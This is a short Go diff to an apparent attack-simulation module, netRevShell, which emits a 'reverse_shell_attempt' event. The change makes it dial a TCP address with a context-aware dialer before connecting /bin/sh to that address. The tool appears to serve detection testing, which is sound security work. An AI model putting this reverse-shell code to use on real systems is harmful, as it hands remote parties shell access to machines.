@@ -45,7 +45,8 @@ func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit m
 	info := n.Info()
 	ev := output.NewEvent(info, "reverse_shell_attempt", false, fmt.Sprintf("connecting /bin/sh to %s", address))
 
-	conn, err := net.Dial("tcp", address)
+	var dialer net.Dialer
+	conn, err := dialer.DialContext(ctx, "tcp", address)
 	if err != nil {
 		ev = output.WithError(ev, err)
 		ev.Success = true
